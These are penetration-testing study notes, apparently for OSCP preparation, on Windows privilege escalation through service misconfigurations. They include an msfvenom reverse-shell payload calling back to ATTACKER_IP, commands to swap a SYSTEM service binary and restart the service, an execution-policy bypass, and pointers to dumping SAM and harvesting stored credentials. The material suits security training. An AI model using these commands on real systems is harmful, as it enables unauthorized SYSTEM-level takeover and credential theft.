Windows Privilege Escalation

1. Identity & Token Enumeration
whoami
echo %USERNAME%
whoami /priv
whoami /groups
whoami /all

Always start here. Identify user, privileges, groups and Integrity Level.

  • SeBackupPrivilege → Dump SAM / SYSTEM
  • SeRestorePrivilege → Overwrite protected files
  • SeImpersonatePrivilege → Token impersonation (Potato)
  • Integrity Level High → Elevated token

7. Unquoted Service Paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto"

OR (better):
Get-CimInstance Win32_Service | Select Name,PathName,StartName

Definition: A service path without quotes may allow Windows to interpret and execute a different binary if intermediate paths are writable.

Example:

C:\Program Files\Vulnerable App\service.exe

Potential hijack targets:

C:\Program.exe
C:\Program Files\Vulnerable.exe

IMPORTANT CONDITIONS (must ALL be true):

  • Path contains spaces
  • No quotes around executable path
  • You have WRITE permissions on one of the intermediate folders

Reality check:

❗ Unquoted path alone is NOT enough. Without write permissions → NOT exploitable.

8. Service Binary Hijacking

Check for services running as System

        Get-CimInstance Win32_Service |
Where-Object {$_.StartName -like "*LocalSystem*"} |
Select Name, State, StartMode, StartName

Check if we can work with it

icacls "C:\Path\To\ServiceBinary.exe"
sc qc ServiceName

Definition: If a service binary is writable and runs as SYSTEM, it can be replaced with a malicious executable.

EXPLOIT CONDITIONS:

  • Service runs as LocalSystem
  • Binary is writable (BUILTIN\Users / Everyone / Authenticated Users)
  • Service can be restarted OR system reboot possible

How to generate malicious executable:

# Reverse shell payload (SYSTEM context)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o malicious.exe

Execution logic:

Service runs as SYSTEM
→ Service executes binary from disk
→ Binary replaced with malicious.exe
→ SYSTEM shell returned to attacker

Exploitation:

# Stop service (if allowed)
sc stop ServiceName

# Backup original (recommended)
copy ServiceBinary.exe ServiceBinary.bak

# Replace binary
copy malicious.exe ServiceBinary.exe

# Start service
sc start ServiceName

IMPORTANT NOTES:

  • ❗ Many SYSTEM services cannot be stopped manually
  • ❗ File may be locked while service is running
  • ✔ Restart capability (CanRestart) is often the real trigger

OSCP RULE:

WRITE + SYSTEM + EXECUTION TRIGGER = EXPLOIT

KEY REMINDER:

You are NOT "escalating privileges" with the EXE.
You are hijacking a SYSTEM execution context.

14. Automated Enumeration
# winPEAS (no installation needed)
.\winPEASx64.exe
# or
.\winPEAS.exe

# PowerUp (PowerShell script - must be loaded first)
Set-ExecutionPolicy Bypass -Scope Process -Force
Unblock-File .\PowerUp.ps1
. .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt (compiled binary)
.\Seatbelt.exe -group=all

Key Concept: These tools only find misconfigurations — they do NOT exploit anything automatically.

Always manually verify findings:

# Example verification commands
icacls "C:\Program Files\..."
Get-CimInstance Win32_Service
schtasks /query /fo LIST /v

How to analyze PowerUp results:

PRIORITY FILTER:

1. SYSTEM context
   - StartName: LocalSystem
   - NT AUTHORITY\SYSTEM

2. WRITE access
   - ModifiableFile
   - ModifiableService
   - Writable registry keys
   - Writable PATH directories

3. Execution control
   - CanRestart: True
   - Service restart possible
   - Scheduled task triggers

4. EXPLOIT RULE:
   WRITE + SYSTEM + EXECUTION = PRIVESC

What to look for in PowerUp:

  • Writable service binaries running as SYSTEM
  • Modifiable services (Invoke-ServiceAbuse candidates)
  • Unquoted service paths + writable directories
  • Writable PATH hijack opportunities
  • AutoLogon / registry stored credentials

How to analyze winPEAS results:

PRIORITY FILTER (winPEAS noise is HIGH):

1. Highlighted "RED" or "IMPORTANT" sections
   → start here always

2. Services section
   - Writable service binaries
   - Unquoted paths
   - Auto-start services as SYSTEM

3. Files / Folders
   - Writable Program Files subfolders
   - Config files (.config, .xml, .ini)

4. Credentials
   - .xml / .config / .ini files
   - Browser / app stored passwords
   - AutoLogon registry entries

5. Interesting misconfigs
   - AlwaysInstallElevated
   - Token privileges
   - Scheduled tasks running as SYSTEM

winPEAS mindset:

  • Do NOT read everything
  • Focus only on RED / HIGH IMPACT sections
  • Cross-check manually with icacls / services / schtasks

OSCP mindset summary:

TOOLS = discovery only

REAL SKILL = identify:

- Where can I write?
- What runs as SYSTEM?
- How is it triggered?

If all 3 match → EXPLOIT exists

Example: How to interpret a real finding

PowerUp Output:

ServiceName: GPGOrchestrator
Path: "C:\Program Files\MilleGPG5\GPGService.exe"
StartName: LocalSystem
ModifiableFileIdentityReference: BUILTIN\Users
CanRestart: True

Analysis:

1. Runs as SYSTEM → HIGH IMPACT
2. Binary is writable → code execution possible
3. Service can restart → execution trigger exists

RESULT:
→ Replace binary → SYSTEM shell

Example: winPEAS Output

[!] Interesting Services - POSSIBLE PRIV ESC
    C:\Program Files\VulnApp\service.exe
    Permissions: BUILTIN\Users (Full Control)
    Runs as: LocalSystem

Analysis:

1. Highlighted as interesting → likely misconfig
2. Writable service binary
3. Runs as SYSTEM

RESULT:
→ Replace service.exe OR inject payload → SYSTEM

Key OSCP Pattern Recognition

PowerUp / winPEAS give different views:

PowerUp:
→ structured, confirms exploitability

winPEAS:
→ noisy, shows "interesting" hints

FINAL DECISION RULE:
If BOTH show:
- Writable file/service
- SYSTEM context

→ EXPLOIT IMMEDIATELY
